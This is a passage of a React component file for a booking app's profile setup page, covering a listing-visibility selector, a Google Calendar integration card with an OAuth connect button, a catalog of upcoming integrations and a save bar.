              >
                <Select
                  id="is_indexable"
                  value={form.is_indexable ? 'listed' : 'hidden'}
                  onChange={(e) => { setForm({ ...form, is_indexable: e.target.value === 'listed' }); setDirty(true); }}
                >
                  <option value="listed">Listed — discoverable in Explore &amp; search (default)</option>
                  <option value="hidden">Hidden — reachable only by direct link</option>
                </Select>
              </FormField>
            </Card>
          </div>
        )}

        {/* ── SECTION: Integrations ── (Google Calendar + catalog only) */}
        {activeSection === 'integrations' && (
          <div className="space-y-5">
            <SectionTitle hint="Connect the tools you already use.">
              Integrations
            </SectionTitle>
            {/* Google Calendar */}
            <FeatureGate flag="google_calendar">
              <Card padded={false} className="p-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    {/* Google icon */}
                    <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-xl border border-neutral-200 bg-neutral-50">
                      <svg className="h-5 w-5" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                      </svg>
                    </div>
                    <div>
                      <h3 className="text-sm font-semibold text-ink">Google Calendar</h3>
                      <p className="mt-0.5 text-xs text-neutral-500">Auto-create Google Meet links for every confirmed online booking.</p>
                      {user?.google_calendar_connected && (
                        <span className="mt-1.5 inline-flex"><LiveChip>Connected</LiveChip></span>
                      )}
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      if (user?.google_calendar_connected) {
                        toast('To disconnect, contact support or revoke access in your Google account settings.', { icon: 'ℹ️' });
                      } else {
                        import('../services/api').then(({ getGoogleAuthUrl }) =>
                          getGoogleAuthUrl().then(({ data }) => { window.location.href = data.url; })
                        );
                      }
                    }}
                    className={cn(
                      'flex-shrink-0 whitespace-nowrap rounded-full border-2 px-4 py-2 text-xs font-semibold transition-colors',
                      user?.google_calendar_connected ? 'border-neutral-300 text-neutral-500 hover:bg-neutral-50' : 'border-maroon/40 text-maroon hover:bg-maroon/5',
                    )}
                  >
                    {user?.google_calendar_connected ? 'Connected ✓' : 'Connect'}
                  </button>
                </div>
                <div className="mt-3 space-y-1 border-t border-neutral-200 pt-3 text-xs text-neutral-400">
                  <p>• Works with online services only (not in-person)</p>
                  <p>• Guests receive the Meet link in their confirmation email</p>
                  <p>• Bookings appear on your Google Calendar automatically</p>
                </div>
              </Card>
            </FeatureGate>

            {/* More integrations — branded favicon cards, expanded catalog */}
            <div>
              <div className="mb-3 flex items-center justify-between">
                <p className="text-xs font-semibold uppercase tracking-wide text-neutral-400">More integrations</p>
                <span className="text-[11px] text-neutral-400">{MORE_INTEGRATIONS.length} more</span>
              </div>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-3">
                {MORE_INTEGRATIONS.map((i) => (
                  <div key={i.name} className="flex flex-col rounded-2xl border border-neutral-200 bg-white p-4 transition-shadow hover:shadow-sm">
                    <div className="flex items-start gap-3">
                      <Favicon domain={i.domain} name={i.name} />
                      <div className="min-w-0 flex-1">
                        <p className="truncate text-sm font-semibold text-ink">{i.name}</p>
                        <p className="mt-0.5 text-xs leading-snug text-neutral-500">{i.desc}</p>
                      </div>
                    </div>
                    <div className="mt-3 flex items-center border-t border-neutral-200 pt-2.5">
                      <span className="inline-flex items-center gap-1 rounded-full bg-neutral-100 px-2 py-0.5 text-[10px] font-semibold text-neutral-500">
                        <span className="inline-block h-1.5 w-1.5 rounded-full bg-neutral-400" />
                        Coming soon
                      </span>
                    </div>
                  </div>
                ))}
              </div>
              <p className="mt-3 text-[11px] text-neutral-400">
                More integrations are on the way. Need one sooner? Let us know from the Help page.
              </p>
            </div>
          </div>
        )}

        {/* Save — sticky action bar, reachable across every tab (pattern #6) */}
        <StickyActionBar>
          <Button type="button" variant="outline" onClick={() => navigate("/dashboard")}>Cancel</Button>
          <button
            type="submit"
            disabled={loading}
            className="rounded-full px-8 py-2.5 text-sm font-semibold text-white transition-colors disabled:opacity-50"
            style={{ background: tc }}
          >
            {loading ? "Saving…" : "Save Profile"}
          </button>
        </StickyActionBar>
      </form>
    </div>
  );
};

export default ProfileSetup;
